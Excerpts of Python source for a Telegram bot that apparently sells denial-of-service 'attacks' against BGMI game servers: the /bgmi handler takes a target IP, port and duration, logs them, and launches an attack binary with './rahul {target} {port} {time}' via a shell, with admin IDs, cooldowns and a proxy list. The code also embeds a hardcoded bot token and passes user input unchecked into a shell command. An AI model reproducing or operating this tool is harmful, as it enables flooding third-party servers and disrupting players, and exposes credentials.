...
# @LASTWISHES0Tg #from keep_alive import keep_alive
# @LASTWISHES0 #keep_alive()
# @LASTWISHES0# insert your Telegram bot token here

    
bot = telebot.TeleBot('7395754249:AAH6K6fBJ_UyZpOO78SXj7B5q-_EOZbQhWs')

# @LASTWISHES0 # Admin user IDs
admin_id = ["6769245930","6769245930"]

# @LASTWISHES0 # File to store allowed user IDs
USER_FILE = "users.txt"

# @LASTWISHES0 # File to store command logs
LOG_FILE = "log.txt"


# @LASTWISHES0 # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # @LASTWISHES0 # Add more proxy addresses as needed
]
...
# @LASTWISHES0# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # @LASTWISHES0 # Check if line is not empty
...
# @LASTWISHES0 # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # @LASTWISHES0 # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# @LASTWISHES0 # Function to clear logs
def clear_logs():
    try:
...
# @LASTWISHES0 # Function to record command logs
...
# @LASTWISHES0 # Function to handle the reply when free users run the /bgmi command
...
# @LASTWISHES0 # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
...
# @LASTWISHES0 # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # @LASTWISHES0 # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # @LASTWISHES0 # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "🦋⁂༄𝙲𝙤𝙤𝕝𝒅𝒐ฬ𝒏༄⁂🦋"
                bot.reply_to(message, response)
                return
            # @LASTWISHES0 # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # @LASTWISHES0 # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # @LASTWISHES0 # Convert time to integer
            time = int(command[3])  # @LASTWISHES0 # Convert port to integer
            if time > 150:
                response = "𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗲𝗻𝘁𝗲𝗿𝗲𝗱 150 𝘀𝗲𝗰"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # @LASTWISHES0 # Call start_attack_reply function
                full_command = f"./rahul {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══"
        else:
            response = "𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝘼𝙏𝙏𝘼𝘾𝙆\n𝗟𝗜𝗞𝗘 :- /bgmi 𝟮.𝟯𝟰.𝟱𝟲.𝟱𝟲 𝟮𝟯𝟰𝟱𝟲 150\n𝗟𝗜𝗞𝗘 :- /bgmi 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══"  # @LASTWISHES0 # Updated command syntax
    else:
...
# @LASTWISHES0 # Add /mylogs command to display logs recorded for bgmi and website commands
